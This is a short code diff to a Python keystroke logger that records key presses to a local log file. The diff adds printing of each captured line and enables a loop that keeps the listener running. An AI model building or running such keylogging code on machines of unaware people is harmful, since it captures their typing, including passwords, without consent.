@@ -16,6 +16,7 @@ with open(logpath, "a") as writer:
 
 
     def write():
+        print(currentline)
         writer.write(currentline)
         print("wrote")
 
@@ -44,5 +45,5 @@ with open(logpath, "a") as writer:
     listener = keyboard.Listener(on_press=onkeypress)
     listener.start()
 
-    # while True:
-    #     sleep(1)
+    while True:
+        sleep(1)
